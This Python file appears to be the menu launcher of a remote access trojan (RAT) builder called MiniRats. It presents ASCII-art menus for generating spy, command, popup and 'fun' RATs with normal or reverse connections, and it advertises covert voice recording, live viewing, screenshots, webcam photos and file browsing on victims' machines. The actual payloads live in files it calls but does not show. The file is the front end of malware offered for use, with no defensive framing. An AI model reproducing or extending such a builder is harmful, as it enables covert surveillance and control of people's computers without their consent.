from colorama import Fore
from sys import path
path.append(__file__.replace("MNLauncher.py",""))
from generator import main as generator
from platform import system as osType
from os import system
def help():
    pass
def clear():
    if "windows" in osType().lower():
        system("cls")
    else :
        system("clear")
def main():
    while 1:
        clear()
        selectionMode=input(f"""{Fore.LIGHTGREEN_EX}
   __________________________________________
 / \                                         \.
|   |                [ Menu ]                |.
 \_ |                                        |.
    | [ 1 ] Generate new MiniRat             |.
    |                                        |.
    |                                        |.
    | [ 2 ] Exit                             |.
    |                                        |.
    |                                        |.
    |                                        |.
    |   _____________________________________/
    |  /                                     |.
    \_/______________________________________/.
    
    Enter your selection : {Fore.RESET}""")
        if selectionMode=='1':
            clear()
            selection=input(f"""{Fore.LIGHTRED_EX}
       __          ___
      // )    ___""    "-.
 \ |,"( /`--""            `.    
  \/ o                      \   {Fore.LIGHTGREEN_EX}  ╔╦╗┬┌┐┌┬  ╦═╗┌─┐┌┬┐┌─┐{Fore.LIGHTRED_EX}
  (   _.-.            ,'"    ;  {Fore.LIGHTGREEN_EX}  ║║║│││││  ╠╦╝├─┤ │ └─┐{Fore.LIGHTRED_EX}
   |\"   /`. \  ,     /       |  {Fore.LIGHTGREEN_EX}  ╩ ╩┴┘└┘┴  ╩╚═┴ ┴ ┴ └─┘{Fore.LIGHTRED_EX}
   | \  ' .'`.; |    |       \.______________________________
     _-'.'    | |--..,\_    \________------------\"\"\"\"\"\"\"\"\"\"\"\"
    '''\"   _-'.'       ___\"-   )
          \'\'\'\"        \'\'\'---~\"\"{Fore.LIGHTYELLOW_EX}
        
        [ 1 ] Spy rat              [ 2 ] CMD rat

        [ 3 ] PoPuP rat            [ 4 ] Fun Rat

        [ 5 ] Exit
    
        Enter your selection : {Fore.RESET}""")
            mode=''
            try:
                if int(selection)<=4 and int(selection)>=1:
                    while 1:
                        clear()
                        modeNum=input(f"{Fore.LIGHTYELLOW_EX}       [ 1 ] Normal connection rat\n\n       [ 2 ] reverse connection rat \n\n       Enter your selection : {Fore.RESET}")
                        if modeNum=='1':
                            mode="server"
                            break
                        elif modeNum=='2':
                            mode="client"
                            break
            except ValueError:
                pass
            if selection=='1':
                clear()
                spyRatNum=input(f"""{Fore.LIGHTYELLOW_EX}
                        ┌                   ┐
                        │ ■ Voice recording │
                        │ ■ Live            │
        [ 1 ] SpyRat 1 <│ ■ Take screenshot │>Executable file size(approx):100M-150M
                        │ ■ Take photo      │
                        │ ■ File explorer   │
                        └                   ┘
                        ┌                   ┐
                        │ ■ Voice recording │
        [ 2 ] SpyRat 2 <│ ■ Live            │>Executable file size(approx):80M-100M
                        │ ■ Take photo      │
                        │ ■ File explorer   │
                        └                   ┘
                        ┌                   ┐
                        │ ■ Voice recording │
        [ 3 ] SpyRat 3 <│ ■ Take photo      │>Executable file size(approx):80M-100M
                        │ ■ File explorer   │
                        └                   ┘
        Enter your selection : {Fore.RESET}""")
                if spyRatNum=="1":
                    generator(mode, f'{__file__.replace("MNLauncher.py","")}RATS/miniRats/spyRats/spyRat1.py')
                if spyRatNum=="2":
                    generator(mode, f'{__file__.replace("MNLauncher.py","")}RATS/miniRats/spyRats/spyRat2.py')
                if spyRatNum=="3":
                    generator(mode, f'{__file__.replace("MNLauncher.py","")}RATS/miniRats/spyRats/spyRat3.py')
            elif selection=='2':
                generator(mode, f'{__file__.replace("MNLauncher.py","")}RATS/miniRats/files/cmdRat.py')
            elif selection=='3':
                generator(mode, f'{__file__.replace("MNLauncher.py","")}RATS/miniRats/files/popupRat.py')
            elif selection=='4':
                generator(mode, f'{__file__.replace("MNLauncher.py","")}RATS/miniRats/files/funRat.py')
            elif selection=='5':
                break
        elif selectionMode=='2':
            break